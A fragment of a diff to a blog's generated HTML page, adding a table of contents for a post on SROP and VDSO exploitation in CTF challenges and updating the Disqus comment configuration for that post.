+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SROP"><span class="nav-number">1.</span> <span class="nav-text">SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#signal-机制"><span class="nav-number">1.1.</span> <span class="nav-text">signal 机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用要点"><span class="nav-number">1.2.</span> <span class="nav-text">利用要点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#要求"><span class="nav-number">1.3.</span> <span class="nav-text">要求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统调用链"><span class="nav-number">1.4.</span> <span class="nav-text">系统调用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sigreturn-gadget"><span class="nav-number">1.5.</span> <span class="nav-text">Sigreturn gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例题"><span class="nav-number">1.6.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#例子-smallest"><span class="nav-number">1.6.1.</span> <span class="nav-text">例子 smallest</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#地址泄露脚本"><span class="nav-number">1.7.</span> <span class="nav-text">地址泄露脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pwnable-kr-unexploitable"><span class="nav-number">1.7.1.</span> <span class="nav-text">pwnable.kr unexploitable</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VDSO"><span class="nav-number"></span> <span class="nav-text">VDSO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#return-to-vdso"><span class="nav-number">1.</span> <span class="nav-text">return to vdso</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关资料："><span class="nav-number">2.</span> <span class="nav-text">相关资料：</span></a></li></ol></div>
             
 
           </div>
@@ -1116,9 +1027,9 @@
   
     <script type="text/javascript">
       var disqus_config = function () {
-        this.page.url = 'https://yuuoniy.github.io/2018/08/06/XMAN-pwn-2/';
-        this.page.identifier = '2018/08/06/XMAN-pwn-2/';
-        this.page.title = 'XMAN-pwn-2';
+        this.page.url = 'https://yuuoniy.github.io/2018/09/19/pwn-srop/';
+        this.page.identifier = '2018/09/19/pwn-srop/';
+        this.page.title = 'CTF | srop 利用';
         };
       function loadComments () {
         var d = document, s = d.createElement('script');
